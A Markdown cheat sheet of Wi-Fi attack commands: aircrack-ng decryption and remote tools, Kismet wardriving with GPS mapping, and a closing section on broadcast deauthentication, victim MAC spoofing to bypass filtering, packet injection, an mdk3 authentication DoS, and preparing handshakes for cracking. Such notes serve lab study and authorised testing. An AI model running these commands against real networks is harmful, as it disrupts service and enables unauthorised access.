# Wifi - Additional Tricks and Tools

## Additional Aircrack-NG Tools

### Remove Wireless Headers

```powershell
airdecap-ng -b $AP_MAC open-network.cap
* -dec.cap: stripped version of the file
```

### Decrypt a WEP encrypted capture file

```powershell
airdecap-ng -w $WEP_KEY wep.cap
```

### Decrypt a WPA2 encrypted capture file

```powershell
airdecap-ng -e $AP_SSID -p $WPA_PASSWORD tkip.cap
```

### Remote Aircrack Suite

```powershell
airmon-ng start wlan0 3
airserv-ng -p 1337 -c 3 -d mon0
airodump-ng -c 3 --bssid $AP_MAC $HOST:$PORT
```

### Wireless Intrusion Detection System

> Require wireless key and bssid

```powershell
airmon-ng start wlan0 3

# create the at0 interface
airtun-ng -a $AP_MAC -w $WEP_KEY mon0
# the interface will auto decrypt packets
```

## Wireless Reconnaissance

> Use CSV file from airodump

CAPR Graph

```powershell
airgraph-ng -i wifu-01.csv -g CAPR -o wifu-capr.png
# color
- green: wpa
- yellow: wep
- red: open
- black: unknown
```

CPG - Client Probe Graph

```powershell
airgraph-ng -i wifu-01.csv -g CPG -o wifu-cpg.png
```

## Kismet

```powershell
kismet
[enter][enter]
[tab][close]

# Select a source and begin a monitoring
Kismet > Add source > wlan0 > Add

.nettxt: data
.pcapdump: wireshark format
```

```powershell
# giskismet: kismet inside a SQL database
> require a GPS receiver

gpsd -n -N -D4 /dev/ttyUSB0
-N : foreground 
-D : debugging level

# kismet will gather SSID and GPS location
giskismet -x kismet.netxml

# generate a kml file (Google Earth)
giskismet -q "select * from wireless" -o allaps.kml
giskismet -q "select * from wireless where Encryption='WEP'" -o wepaps.kml
```

## Other things

```powershell
# Find Hidden SSID
aireplay-ng -0 20 –a <BSSID> -c <VictimMac> mon0

# Mac Filtering
macchanger –-mac <VictimMac> wlan0mon
aireplay-ng -3 –b <BSSID> -h <FakedMac> wlan0mon
# MAC CHANGER
ifconfig wlan0mon down
macchanger –-mac <macVictima> wlan0mon
ifconfig wlan0mon up

# Deauth Global
aireplay-ng -0 0 -e hacklab -c FF:FF:FF:FF:FF:FF wlan0mon

# Authentication DoS Mode
mdk3 wlan0mon a -a $AP_MAC

# Tshark - Filter and dislay data
tshark -r Captura-02.cap -Y "eapol" 2>/dev/null
tshark -i wlan0mon -Y "wlan.fc.type_subtype==4" 2>/dev/null
tshark -r Captura-02.cap -Y "(wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol) && wlan.addr==20:34:fb:b1:c5:53" 2>/dev/null

# Convert .cap with handshake to .hccap
aircrack-ng -J network network.cap
```